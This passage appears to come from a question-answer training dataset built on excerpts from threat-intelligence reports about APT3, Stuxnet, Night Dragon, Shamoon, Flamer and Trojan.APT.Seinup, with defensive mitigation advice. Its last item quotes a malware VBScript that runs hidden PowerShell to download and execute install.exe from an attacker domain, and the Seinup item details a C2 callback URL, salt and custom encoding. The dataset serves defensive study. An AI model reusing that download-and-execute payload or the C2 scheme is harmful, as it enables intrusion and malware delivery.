2014.\nAcademic research spanning decades documents an MSS operational model that utilizes organizations, seemingly without an intelligence mission, at all levels of the state to serve as cover for MSS intelligence operations.\nAccording to its website, Boyusec has only two collaborative partners, one of which (Huawei) it is working\nwith to support Chinese intelligence services, the other, Guangdong ITSEC, which is actually a field site for a branch of the MSS.\nGraphic displaying the relationship between the MSS and APT3.\nBig Headline: Impact\nThe implications are clear and expansive. Recorded Future's research leads us to attribute APT3 to the Chinese Ministry of State Security and Boyusec with a high degree of confidence. Boyusec has a (<http://freebeacon.com/national-security/pentagon-links-chinese-cyber-security-firm-beijing-spy-service/>)documented history of producing malicious technology and working with the Chinese intelligence services.\nAPT3 is the first threat actor group that has been attributed with a high degree of confidence directly to the MSS. Companies in sectors that have been victimized by APT3 now must adjust their strategies to defend against the resources and technology of the Chinese government. In this real-life David versus Goliath situation, customers need both smart security controls and policy, as well as actionable and strategic threat intelligence.\nAPT3 is not just another cyber threat group engaging in malicious cyber activity; research indicates that Boyusec is an asset of the MSS and their activities support China's political, economic, diplomatic, and military goals.\nThe MSS derives (<https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol.-56-no.-3/pdfs/Mattis-Understanding Chinese Intel.pdf>)intelligence collection requirements from state and party leadership, many of which are defined broadly every five years in official government directives called Five Year Plans. Many APT3 victims have fallen into\nsectors highlighted by the most recent (<http://en.ndrc.gov.cn/newsrelease/201612/P020161207645765233498.pdf>)Five Year Plan, including green/alternative energy, defense-related science and technology, biomedical, and aerospace.\nQuestion: What are the implications of APT3's activities being aligned with China's Five Year Plans, and how does this impact the sectors targeted by APT3?",
    "output": "Answer: APT3's activities align with China's Five Year Plans, which define intelligence collection requirements from state and party leadership. Many APT3 victims fall into sectors highlighted by these plans, including green/alternative energy, defense-related science and technology, biomedical, and aerospace. This alignment suggests that APT3's activities are strategically directed to support China's broader political, economic, diplomatic, and military goals. Companies in these sectors must be aware of this strategic alignment and enhance their defenses accordingly to protect against state-sponsored cyber espionage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: MITIGATIONS\nThe FBI and CISA recommend organizations remain cognizant of the threat of state-sponsored cyber actors exploiting default MFA protocols and exfiltrating sensitive information. Organizations should:\n\u2022 Enforce MFA for all users, without exception. Before implementing, organizations should review configuration policies to protect against \"fail open\" and re-enrollment scenarios.\n\u2022 Implement time-out and lock-out features in response to repeated failed login attempts.\n\u2022 Ensure inactive accounts are disabled uniformly across the Active Directory, MFA systems etc.\n\u2022 Update software, including operating systems, applications, and firmware on IT network assets in a timely manner. Prioritize patching , especially critical and high vulnerabilities that allow for remote code execution or denial-of-service on internet-facing equipment.\n\u2022 Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to have strong, unique passwords. Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access.\n\u2022 Continuously monitor network logs for suspicious activity and unauthorized or unusual login attempts.\n\u2022 Implement security alerting policies for all changes to security-enabled accounts/groups, and alert on suspicious process creation events (ntdsutil, rar, regedit, etc.).\nNote: If a domain controller compromise is suspected, a domain-wide password reset\u2014including service accounts, Microsoft 365 (M365) synchronization accounts, and krbtgt\u2014will be necessary to remove the actors' access. (For more information, see ). Consider soliciting support from a third-party IT organization to provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.\nFBI and CISA also recommend organizations implement the recommendations listed below to further reduce the risk of malicious cyber activity.\nMedium Headline: Security Best Practices\n\u2022 Deploy Local Administrator Password Solution (LAPS), enforce Server Message Block (SMB) Signing, restrict Administrative privileges (local admin users, groups, etc.), and review sensitive materials on domain controller's SYSVOL share.\n\u2022 Enable increased logging policies, enforce PowerShell logging, and ensure antivirus/endpoint detection and response (EDR) are deployed to all endpoints and enabled.\n\u2022 Routinely verify no unauthorized system modifications, such as additional accounts and Secure Shell (SSH) keys, have occurred to help detect a compromise. To detect these modifications, administrators can use file integrity monitoring software that alerts an administrator or blocks unauthorized changes on the system.\nMedium Headline: Network Best Practices\n\u2022 Monitor remote access/RDP logs and disable unused remote access/RDP ports.\n\u2022 Deny atypical inbound activity from known anonymization services, to include commercial VPN services and The Onion Router (TOR).\n\u2022 Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.\n\u2022 Regularly audit administrative user accounts and configure access control under the concept of least privilege.\n\u2022 Regularly audit logs to ensure new accounts are legitimate users.\n\u2022 Scan networks for open and listening ports and mediate those that are unnecessary.\n\u2022 Maintain historical network activity logs for at least 180 days, in case of a suspected compromise.\n\u2022 Identify and create offline backups for critical assets.\n\u2022 Implement network segmentation.\n\u2022 Automatically update anti-virus and anti-malware solutions and conduct regular virus and malware scans.\n\nQ: Why is it important to continuously monitor network logs for suspicious activity and unauthorized or unusual login attempts? What specific actions can be taken to enhance this monitoring?",
    "output": "A: Continuous monitoring of network logs is important because it allows organizations to detect and respond to potential security breaches in real-time. Specific actions to enhance this monitoring include implementing security alerting policies for changes to security-enabled accounts/groups and alerting on suspicious process creation events such as ntdsutil, rar, and regedit. This proactive approach helps in identifying and mitigating threats before they cause significant damage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Stuxnet\nThe Stuxnet incident and its relatives Duqu, Flamer and Gauss are some of the most talked-about cases of targeted attacks. As far as we know today, the Stuxnet operation began in November 2005 with the registration of the command and control (C&C) servers used in the attacks. The first recorded appearance of what we now call Stuxnet version 0.5 was in November 2007. Since then, a handful of different versions have been found and analyzed. Stuxnet 1.x is based on what is now known as the \"tilded\" platform; whereas Stuxnet 0.5 is based on the Flamer framework. The code segments and programming style differ, which indicates that two different programming teams were most likely responsible for the different branches of Stuxnet. Thorough investigation into the mechanism and functions of this threat started in July 2010. Stuxnet is the first known autonomous threat to target and sabotage industrial control systems to such an extent.\nStuxnet is a sophisticated piece of malware, which uses seven vulnerabilities to spread and infect its targets. The most notable vulnerability is the  (CVE-2010-2568), which allows it to auto-execute on USB drives. Spreading through infected portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the Internet. This was most likely the first infection vector used by Stuxnet. In addition, it is able to infect Step7 project files, which are used to control Programmable Logic Controllers (PLCs). This allowed the worm to infect computers whenever the engineer exchanged the project files. Besides this, it also spread through network shares, a printer spooler vulnerability, an old Windows RPC (remote procedure calls) vulnerability and a known password in the WinCC database. In the end, Stuxnet propagated further than its authors probably intended. We have monitored more than 40,000 infected IP addresses in 155 countries. Many of those systems are most likely just collateral damage and were not intended to be infected by the attackers. For example multiple computers at Chevron were infected by Stuxnet, without any damage being done.\nPart of the malware code was signed with stolen digital certificates making it harder to detect by security tools. To hide its activity even further, Stuxnet executed slightly different infection routines depending on the security software installed on the target. On the USB drive itself, the malware would hide its own files and even delete itself from it after three successful propagations. Tricks like these, to make the detection of the malware more difficult, are now frequently used in modern targeted attacks.\nStuxnet's payload focused on PLCs, which are used to control different industrial components. The target of the Stuxnet operation is believed to be a uranium enrichment facility in Iran. The sabotage payload disrupted and partially destroyed the cascaded high frequency gas centrifuges. The early version of Stuxnet targeted the S7-417 PLCs and modified its valve settings. Closing the valves at certain points in time would lead to an increase of pressure that could damage the equipment. The later version of the threat focused on the S7-315 PLCs, manipulating the spinning frequency of the rotating motors. By speeding the centrifuges up and slowing them down repeatedly, the output quality could be spoiled and the centrifuges themselves could be damaged. The payload would only become active if the fingerprint in the found PLC setup matched a given configuration setup. This minimized the collateral damage at other facilities and showed that the attackers had in-depth knowledge of the targeted uranium enrichment facilities. To avoid detection by personnel monitoring the human machine interface (HMI) of the plant, the threat recorded measurement readings during normal operation and played those back in a loop.\nSmall Headline: Night Dragon\nOperation Night Dragon, which was uncovered in 2010, is a typical example of global oil companies being targeted, but this time not with the aim of disruption in mind. The attacks started in late 2009 and were directed at finding project details and financial information about oil and gas field exploration and bids.\nThe attackers started by compromising public facing Web servers through SQL injection and installing Web shells on them. Once they had control over the server they used common hacking tools to harvest local\npasswords, dump password hashes, sniff authentication messages and exploit internal active directory configuration. This allowed them to move on to other internal computers using the gathered passwords. In addition, spear phishing messages were used to compromise additional computers. The attackers did not use any zero-day vulnerabilities during their attacks. Rather they used publicly available tools for each individual job.\nOn compromised computers a common  was installed that communicated back to the C&C server, allowing remote access to the computer. This allowed the attacker to find and extract valuable information.\nSmall Headline: Shamoon/Disttrack\nIn August 2012 an extremely destructive cyberattack hit an estimated 30,000 computers at one of the largest oil producers of the world in Saudi Arabia. The  malware used in this attack, also known as Shamoon, consists of three components: a dropper, a wiper and a reporter module.\nThe dropper component is responsible for creating all the required files on the system, registering a service called \"TrkSvr\" in order to start itself with Windows. It also attempts to copy itself to accessible network shares and execute itself remotely if successfully copied.\nThe wiper component is only activated when a hardcoded configuration date has been passed. This enables a coordinated, \"time bomb\" scenario. The module then drops a legitimate and digitally signed device driver that provides low level disk access from user space. The malware collects file names and starts overwriting them with a JPEG image or 192KB blocks of random data. At the end Disttrack finishes the computer off by wiping the master boot record with the same data.\nThe reporter component is responsible for sending back a HTTP GET request to the C&C server. It reports the domain name, IP address and number of files overwritten.\nBy acquiring user credentials and gaining access to the domain controller the attackers were able to push the malware on to many systems before they triggered the destructive payload. Disttrack's secondary goal may have been to steal valuable information from infected computers, but the main intent was to render the computers unusable by wiping the operating system and master boot record, causing disruption and downtime at the targeted company. Although wiping is also frequently used to destroy evidence of the attack and make forensics more difficult. The malware does not contain any payload against ICS, like Stuxnet does for PLCs, and is not as sophisticated. According to the company, no computer related with the production or distribution of oil was affected, since the operational network is separated and specially protected.\nOne group that claimed responsibility for the attack posted on Pastebin that it was an anti-oppression hacker group. The attack was prompted by disappointment with some of the regimes in the Middle East, the group said. True or not, this shows that it is not necessarily only state-sponsored attackers who are carrying out disruptive attacks. Sabotage attacks usually fall into the orbit of hacktivists, who seek attention rather than profit. Some sources reported that the attackers had help from insiders, which would explain the so far unclear infection vector.\nSoon after this attack became known, a Qatari gas company was attacked in a similar way.\nMedium Headline: Spear phishing attacks in the energy sector\nSpear phishing is, along with watering hole attacks, one of the most common attack vectors used to attack companies. The attacks are simple to carry out. They often follow the same pattern, starting with a reconnaissance phase to gather all publicly available information. This is followed by the incursion phase of breaking in and compromising computers. After that comes the discovery phase, where the attacker gathers passwords and maps the internal network. The final stage is capture and exfiltration, where the valuable information is copied and sent back to the attacker. The last phase may also involve a disruption attack if the goal is sabotage. For a more detailed analysis of the attack phases, see Appendix C.\nA spear phishing attack consists of an email with either a malicious attachment or a link to a malicious website. Such emails are sent in bulk to a handful of key users. These waves are often repeated till enough people fall for the bait and compromise their computers. For analysis on the social engineering themes used, attack details and attachment types used, see Appendix A.\n\nQ: What were the primary goals and methods used by the attackers in Operation Night Dragon, and how did they gain access to internal networks?",
    "output": "A: The primary goal of Operation Night Dragon was to find project details and financial information about oil and gas field exploration and bids. The attackers started by compromising public-facing web servers through SQL injection and installing web shells on them. Once they had control over the server, they used common hacking tools to harvest local passwords, dump password hashes, sniff authentication messages, and exploit internal active directory configurations. This allowed them to move on to other internal computers using the gathered passwords. Additionally, spear phishing messages were used to compromise additional computers. The attackers did not use any zero-day vulnerabilities; instead, they relied on publicly available tools for each individual job.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 6 Summary\nTargeted surveillance of individuals conducted by nation-states poses an exceptionally challenging security problem, given the great imbalance of resources and expertise between the victims and the attackers. We have sketched the nature of this problem space as reported to us by targeted individuals in three Middle Eastern countries. The attacks include spyware for ongoing monitoring and the use of \"IP spy\" links to deanonymize those who voice dissent.\nThe attacks, while sometimes incorporating effective social engineering, in general lack novel technical elements. Instead, they employ prepackaged tools developed by vendors or acquired from the cybercrime underground. This technology sometimes suffers from what strike us as amateurish mistakes (multiple serious errors implementing cryptography, broken protocol messages), as does the attackers' employment of it (identifying-information embedded in binaries, C&C servers discoverable via scanning or \"Google hacking\", clusters of attack accounts tied by common activity). Some of these errors assisted our efforts to assemble strong circumstantial evidence of governmental origins. In addition, we mapped out the global use of two \"governmental\" hacking suites, including identify-\ning 11 cases in which they appeared to be used in countries governed by \"authoritarian regimes.\"\nWe aim with this work to inspire additional research efforts addressing the difficult problem of how to adequately protect individuals with very limited resources facing very powerful adversaries. Open questions include robust, practical detection of targeted attacks designed to exfiltrate data from a victim's computer, as well as detection of and defense against novel attack vectors, like tampering with Internet connections to insert malware.\nThe task is highly challenging, but the potential stakes are likewise very high. An opposition member, reflecting on government hacking in Libya, speculated as to why some users would execute files even while recognizing them as potentially malicious [2]: \"If we were vulnerable we couldn't care less ... we were desperate to get our voices out ... it was a matter of life or death ... it was just vital to get this information out.\"\nMedium Headline: Acknowledgment\nThis work was supported by the National Science Foundation under grants 1223717 and 1237265, and by a Citizen Lab Fellowship. Any opinions, findings, and conclusions or recommendations expressed in this material are those of the authors and do not necessarily reflect the views of the sponsors.\nThe authors would like to thank the following individuals for their help in various aspects of our analysis: Bernhard Amman, Collin D. Anderson, Brandon Dixon, Zakir Durumeric, Eva Galperin, Claudio Guarnieri, Drew Hintz, Ralph Holz, Shane Huntley, Andrew Lyons, Mark Schloesser, and Nicholas Weaver.\nQuestion: How do the attacks conducted by nation-states against individuals differ in terms of technical sophistication compared to typical cybercrime attacks? Why might this observation be significant for cybersecurity experts?",
    "output": "Answer: The attacks conducted by nation-states against individuals generally lack novel technical elements and often incorporate prepackaged tools developed by vendors or acquired from the cybercrime underground. These tools sometimes suffer from amateurish mistakes, such as multiple serious errors in implementing cryptography, broken protocol messages, identifying information embedded in binaries, and C&C servers discoverable via scanning or 'Google hacking.' This observation is significant for cybersecurity experts because it indicates that despite the high stakes and powerful adversaries, many of these attacks can be countered with well-known security practices, settings, and software updates. Additionally, the mistakes made by attackers can provide valuable evidence for attribution and understanding the origin of the attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The control panel\nAccess to the Flamer control panel requires authentication:\nFigure 5\nControl panel login page\nThe following credentials are used to gain access to the control panel (only the MD5 password hash is available; attempts to crack the password were unsuccessful):\nUsername: username\nPassword Hash: 27934e96d90d06818674b98bec7230fa\nThe control panel for interacting with Flamer-compromised computers is very basic. The simple interface allows the operators to upload packages and download encrypted data stolen from the compromised clients. The operator is required to upload specially crafted tar.gz files. The archived filename needs to follow a specific format, which is parsed and then stored in the ads or news directory, depending on the file extension used.\nThe filename format for these packages is as follows:\nThe following is a screen shot of the control panel that allows the operator to upload data to the server:\nFigure 6\nControl panel data upload screen\nThis approach to uploading packages and downloading data fits the profile of military and intelligence operations. A typical control panel is easy to use and self-explanatory. The operator has full control over what to do with the compromised clients and has the ability to retrieve and inspect the stolen information. The Flamer control panel provides limited capabilities to the operator, preventing them from viewing and interpreting the information being exchanged.\nThis approach would help prevent operators from knowing what is contained within the packages or the significance of the data being exchanged between clients and the attackers. Such a design would also serve as a defensive measure as it would prevent arbitrary packages from being uploaded and prevent downloaded data being from being inspected by unknown parties that may have gained access to the control panel.\nThe following screen on the control panel allows the user to view and download backed up data from the server:\nFigure 7\nControl panel screen for downloading stolen data\nThe tar.gz contains all the relevant stolen data and details of where the information was stolen from. The private key is required here to inspect the encrypted data.\nSmall Headline: Schema\nThe database is used to store the relevant data about connecting clients, packages to send to the clients, some logging and settings required for encryption, and authentication to access the control panel.\nFigure 8\nNewsforyou application database schema\nThe session_log, log, and client_log are all encrypted using the keys stored in the settings table shown below and were successfully decrypted:\nThe database is regularly emptied by the delete.php script; there is limited data in it. The following table gives a brief description of the tables found in the database:\nThe session_log table contains details of all connections to the server while client_log only contains connections with a recognized protocol (e.g. valid compromised computers).\nExamining the data in the table indicates that 1071 valid requests were recorded from compromised clients. A decrypted client log entry contains the following information:\nCLIENT _ ID:[UUID]\nCLIENT _ TYPE:3\nCLIENT _ VERSION:0\nREQUEST _ TYPE:0\nNAME=&FILE _ SIZE=0\nPROTOCOL:1\nThe four encrypted requests in the database on the first server are W32.Flamer client requests, which use the old protocol:\n\u2022 CLIENT\n\u2022 PROTOCOL\n= 3 =\nCLIENT_TYPE_FL\n= 1\n= OLD_PROTOCOL\nThe additional sessions logged are likely attributed to researchers who had discovered the whereabouts of the command-and-control servers.\nThe session_log data contained three separate HTTP_HOST values, indicating multiple Flamer C&C server URLs were used to access this server.\nAlthough only one encrypted file existed in the newsforyou/entries folder (the stolen data uploaded from the compromised clients), the database reveals that 189 records had been created. The other 188 files had already been removed from the server. The entry left on the server had been successfully stolen from the computer located in Israel.\nA final point to note here is in relation to the entry in the news_entries table. Only one record ever existed: the malicious payload to clean the computers up, uploaded on May 18, 2012, at 13.43:45. This server only served up one package and it was uploaded as soon as the server had been initially configured. The last time a compromised client connected to the server was Friday, June 1, 2012, at 11:42:47, and the last log recorded in the database was Friday, June 1, 2012, at 11:46:01.\nBig Headline: Conclusion\nExamining the W32.Flamer servers has provided additional insight into the architecture of not only the threat, but also into the command structure of the entities behind it. The server code was written and updated by at least four separate individuals, indicating a continuing development effort to support W32.Flamer and, potentially, new or additional threats of a similar nature. The command-and-control Web application has been in active development for many years, possibly as early as 2006, which is well before Flamer's earliest seen compilation date in 2010.\nThe operators of the C&C servers may be a group of less senior individuals, working on a need-to-know basis, as the operator is not required (nor has the permission) to interpret the value or purpose of the incoming data. Only the attackers have the permission to access and interpret this data. This separation of operational and attacker visibility and roles indicates that this is the work of a highly organized and sophisticated group. The likelihood of a large and well-funded entity's involvement in Flamer is corroborated by the use of the unique certificate weakness used to hijack the Windows Update feature to spread across networks.\nThey were also careful to unload and archive data where necessary, remove duplicate files, and delete unnecessary files to prevent the server from running out of disk space. This was an ongoing development up to 2011. R***'s edits in the source code suggest the concern was less about updating protocols and more about ensuring there was ample room on the servers for the stolen data to be uploaded to, begging the question of how much data was actually being stolen.\nThis investigation simply provides a snapshot in time of the Flamer attack campaign. Considering that logging was disabled and data was wiped clean in such a thorough manner, the remaining clues make it virtually impossible to determine the entity behind the campaign. There is little doubt that the larger project involving cyber-espionage tools, such as Flamer, will continue to evolve and retrieve information from the designated targets.\nBig Headline: Resources\nFlamer: Highly Sophisticated and Discreet Threat Targets the Middle East (<http://symantec.com/connect/blogs/flamer-highly-sophisticated-and-discreet-threat-targets-middle-east>)http://symantec.com/connect/blogs/flamer-highly-sophisticated-and-discreet-threat-targets-middle-east\nPainting a Picture of W32.Flamer\nFlamer: A Recipe for Bluetoothache\nW32.Flamer: Spreading Mechanism Tricks and Exploits (<http://symantec.com/connect/blogs/w32flamer-spreading-mechanism-tricks-and-exploits>)http://symantec.com/connect/blogs/w32flamer-spreading-mechanism-tricks-and-exploits\nW32.Flamer: Leveraging Microsoft Digital Certificates (<http://symantec.com/connect/blogs/w32flamer-leveraging-microsoft-digital-certificates>)http://symantec.com/connect/blogs/w32flamer-leveraging-microsoft-digital-certificates\nW32.Flamer: Microsoft Windows Update Man-in-the-Middle (<http://symantec.com/connect/blogs/w32flamer-microsoft-windows-update-man-middle>)http://symantec.com/connect/blogs/w32flamer-microsoft-windows-update-man-middle\nW32.Flamer: Enormous Data Collection (<http://symantec.com/connect/blogs/w32flamer-enormous-data-collection>)http://symantec.com/connect/blogs/w32flamer-enormous-data-collection\nFlamer: Urgent Suicide\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nBig Headline: About Symantec\nSymantec is a global leader in providing security, storage and systems management solutions to help businesses and consumers secure and manage their information. Headquartered in Mountain View, Calif., Symantec has operations in more than 40 countries. More information is available at (<www.symantec.com>)www.symantec.com.\nFor specific country offices and contact numbers, please visit our Web site. For product information in the U.S., call toll-free 1 (800) 745 6054.\nSymantec Corporation\nWorld Headquarters\n350 Ellis Street\nMountain View, CA 94043 USA\n+1 (650) 527-8000\nCopyright \u00a9 2012 Symantec Corporation. All rights reserved. Symantec and the Symantec logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\nQuestion: What role did the database play in the operation of the Flamer command-and-control server, and how was data security managed within the database?",
    "output": "Answer: The database played a crucial role in storing relevant data about connecting clients, packages to send to the clients, some logging, and settings required for encryption and authentication to access the control panel. Data security within the database was managed by encrypting the session_log, log, and client_log tables using keys stored in the settings table. The database was regularly emptied by the delete.php script to maintain minimal data retention. This approach helped in preventing the server from running out of disk space and hindered potential investigations if the server were to be discovered.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 3.1. Redirection Using Google Docs\nBy connecting the malicious server via Google Docs, the malicious communication is protected by the legitimate SSL provided by Google Docs (see Figure below). One possible way to examine the SSL traffic is to make use of a hardware SSL decrypter within an organisation. Alternatively, you may want to examine the usage pattern of the users. Suppose a particular user accesses Google Docs multiple times a day, the organization's Incident Response team may want to dig deeper to find out if the traffic is triggered by a human or by malware.\nBelow is the code that is used to construct a URL that retrieves command via Google Docs. First, the malicious URL is constructed and then encoded. Next, the malware simply leverages the Google Docs viewer to retrieve the command from the malicious server (see Figure below).\nMedium Headline: 3.2. Zero-Skipping XOR Encryption\nThe shellcode encryption technique is fairly standard. The shellcode has a decryption stub which decrypts its body using the XOR key 0x9E, and this shellcode is used to extract exp1ore.exe(malware) and Wor.doc (benign document).\nThe exp1ore.exe and Wor.doc were found within the spear phishing document encrypted using the same key (0xFC) and technique. The XOR key decrypts only a non-zero byte (see Figure 5). This prevents statistical methods of recovering the XOR key. The encrypted executable file and benign document were identified to be located inside the spear phishing document at offsets 0\u00d72509 and 0\u00d743509 respectively.\nEven though statistical methods may not be useful in identifying the XOR key as the zero bytes are not encrypted, we could use some of the \"known\" strings below to hunt for the XOR key in this situation. By sliding the known string across the array of bytes to perform a windowed XOR, the key would be revealed when the encoded data is XORed with the known string.\n\"This program cannot be run in DOS mode\"\n\"KERNEL32.dll\"\n\"LoadLibraryA\"\nSmall Headline: 3.3.1. Secure Callback\nThe malware performs the callback in a secure manner. It uses a custom Base64 map to encode its data, and creates a salted digital thumbprint to allow validation of data.\nBelow describes the steps to validate a callback using an example of the following URL:\nhxxp://www.elizabearden.com/waterphp/BYyH.php? dEIXozUlFzx=5P&wDq=6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk==&k4fJdSp7=cc3237bc79192a096440faca0fdae10&GvQF2lotIr5bT2=\nThe URL could be generalised as follows:\nDomain/<PHP>?<rand 11-13 char>=<A'>&<rand 3-5 char>=<B'>&<rand 7-9 char>=<C'>&<rand 14-16 chars>=<D'>\nThe definition of A', B', C' and D' are as follows:\nLet H be the function which encodes binary into hexadecimal characters prepend with \"%\", if it is not alphanumeric, dash, underscore or dot.\nLet B64 be the base 64 encoder using the following custom map, \"URPBnCF1GuJwH2vbkLN6OQ/5S9TVxXKZaMc8defgiWjmo7pqrAstyz0D+El3I4hY\".\nLet PT be the plain text which is in the form of \"<HostName>[<RunType>]:<IPAddress>{1}\", where HostName and IPAddress are string, and RunType is a character.\nLet A be the random of 3 to 7 characters, and A' = H(A)\nLet B be B64 (PT), and B' = H(B)\nLet C be 32 char deliminator, and C' = H(C)\nLet D be H( MD5 ( salt + MD5 ( B64(PT) + A + C ) ) ), salt = \"%^^*HFH)*$FJK)234sd2N@C(JGl2z94cg23\u2033 , and D' = H(D)\nHence, in this case, the specific malicious URL could be applied as follows:\nDomain/<PHP> = http://www.elizabearden.com/waterphp/BYyH.php\nA' = \"5Pb\"\nB' = \"6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S%2Bw8npH5oAZk==\"\nC' = \"cc3237bc79192a096440faca0fdae107\"\nD' = \"349118df672db38f9e65659874b60b27\" (This is the digital signature)\nThe hash could be verified as follow:\nB64(PT) + A + C = \"6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk==\" + \"5Pb\" + \"cc3237bc79192a096440faca0fdae107\"\nMD5 (B64(PT) + A + C) = \"766cf9e96c1a508c59f7ade1c50ecd28\"\nMD5 (salt + MD5(B64(PT) + A + C)) = MD5 ( \"%^^*HFH)*$FJK)234sd2N@C(JGl2z94cg23\" + \"766cf9e96c1a508c59f7ade1c50ecd28\")\n= 349118df672db38f9e65659874b60b27 (This equals to D', which means verified)\nThe encoded plain text (B) could be recovered:\nB64(PT) = \"6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk==\";\nPT = \"MY_COMPUTER_NAME[F]:192.168.1.1{1}\", where \"MY_COMPUTER_NAME\" is the hostname, 'F' is the run type, \"192.168.1.1\" is the IP address.\nNote: This example is mocked up using a dummy computer name and IP address.\nThe python code below could be used to decode the custom encoded string (see Figure below).\nMedium Headline: 3.4. In-Memory Only Malicious Code\nOn the disk, the malicious code is either encrypted or compressed to evade scanning using signature rules. Only upon being loaded into memory, does the malicious code (that appears to be in the form of a DLL) get manually loaded without the use of Windows 32 API. In this way, when an investigation is performed, the malicious DLL is not revealed. Additionally, it makes it much harder for analysis to be performed.\nTaking a deeper look at the decrypted malicious code, this malware was found to contain at least the following functions:\nDownload file\nDownload and execute or load library\nChange sleep duration\nOpen and close interactive sessions\nBig Headline: 4. Conclusion\nMalware is increasingly becoming more contextually advanced. It attempts to appear as much as possible like legitimate software or documents. In this example, we would conclude the following.\n1. A potentially stolen document was used as a decoy document to increase its credibility. It is also a sign that the compromised organisations could be used as a soft target to compromise their business partners and allies.\n2. It is important to put a stop to the malware infection at the very beginning, which is the exploitation phase. Once a network is compromised, it is increasingly harder to detect such threats.\n3. Anti-incident response/forensic techniques are increasingly used to evade detection. It would require a keen eye on details and a wealth of experience to identify all\nthese advance techniques.\nQ: How does Trojan.APT.Seinup ensure secure callbacks, and what steps are involved in validating a callback URL?",
    "output": "Trojan.APT.Seinup ensures secure callbacks by using a custom Base64 map to encode its data and creating a salted digital thumbprint to allow validation of data. The validation process involves several steps: encoding binary into hexadecimal characters, using a custom Base64 map, and generating a digital signature using MD5 hashing with a salt. The URL is structured with random characters and encoded values for the hostname, run type, IP address, and digital signature. The hash can be verified by concatenating the Base64-encoded plain text, a random string, and a delimiter, then applying MD5 hashing twice with a salt. The final hash should match the digital signature in the URL, confirming its validity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do adversaries like TAG-38 compromise third-party servers, such as DVR/IP camera devices, to support their operations, including Command and Control, in the context of targeting Indian power grid assets?",
    "output": "Adversaries like TAG-38 compromise third-party servers, such as DVR/IP camera devices, to support their operations by exploiting vulnerabilities, including the use of default credentials. These compromised devices are then used for Command and Control (C2) communications, allowing the adversaries to remotely control and coordinate their attacks. In the context of targeting Indian power grid assets, TAG-38 has been observed using compromised DVR/IP camera devices as C2 servers, which are primarily geolocated in Taiwan or South Korea. The use of these compromised devices allows TAG-38 to maintain a level of anonymity and evade detection, while still being able to conduct their operations. Furthermore, the compromise of these devices highlights the importance of securing IoT devices, such as DVR/IP camera systems, and ensuring that software and firmware are kept up to date, and default passwords are changed to strong, complex ones.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Spearphish\nThe body of the message is below:\nOne Month's Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS 4,000 MODELS Nude Celebrities,Playmates,Cybergirls & More! Click hxxp://join.playboysplus.com/signup/ To Get a Free Plus Member Now & Never Miss Another Update. Your Member referrals must remain active. If anyone getting \"Promotion not available\" for 1 month free membership, you might get the issue up to 48 hrs once your membership is expired and make sure to Clear out cookies or use another browser or use another PC.\nThe webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the affected users' system to download the below payload:\nfunction runmumaa()\nOn Error Resume Next\nset shell=createobject(\"Shell.Application\")\nshell.ShellExecute \"powershell.exe\",\"-NoLogo -NoProfile\nHidden ( New-Object\n\"System.Net.WebClient\").DownloadFile(\"http://www.playboysplus.com\n/install/install.exe\",\"install.exe\");Invoke-Item install.exe\", \"\", \"open\", 1\nend function\nThe CVE-2014-6332 exploit code seen in this incident is derived from the code published at (<http://www.exploit-db.com/exploits/35230/>)http://www.exploit-db.com/exploits/35230/, which has also been incorporated in the Metasploit project.\nBig Headline: The Downloader\nAfter the exploit or script executes, the system downloads install.exe, which has the following metadata:\nMD5 5a0c4e1925c76a959ab0588f683ab437\nSize 46592 bytes\nCompile Time 2014-11-19 08:55:10Z\nImport Hash 6b8611f8148a6b51e37fd68e75b6a81c\nThe file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path\n\"C:\\Users\\Public\", which fails on Windows XP because that path is not present by default.\nThe first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe with the elevated privileges. These files have the following metadata:\ndoc.exe (x86):\nMD5 492a839a3bf9c61b7065589a18c5aa8d\nSize 12288 bytes\nImport Hash 9342d18e7d315117f23db7553d59a9d1\ndoc.exe (x64):\nMD5 744a17a3bc6dbd535f568ef1e87d8b9a\nSize 13824 bytes\nCompile Time 2014-11-19 08:25:45Z\nImport Hash 2fab77a3ff40e4f6d9b5b7e813c618e4\ntest.exe:\nCompile Time 2014-11-18 10:49:23Z\nImport Hash f34d5f2d4577ed6d9ceec516c1f5a744\nThese payload files also have interesting PDB debug strings.\ninstall.exe:\nC:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\MyRat\\Client\\Client \\obj\\x86\\Release\\Client.pdb\nThe most interesting PDB string is the \"4113.pdb,\" which appears to reference CVE-2014-4113. This CVE is a local kernel vulnerability that, with successful exploitation, would give any user SYSTEM access on the machine.\nThe malware component, test.exe, uses the Windows command 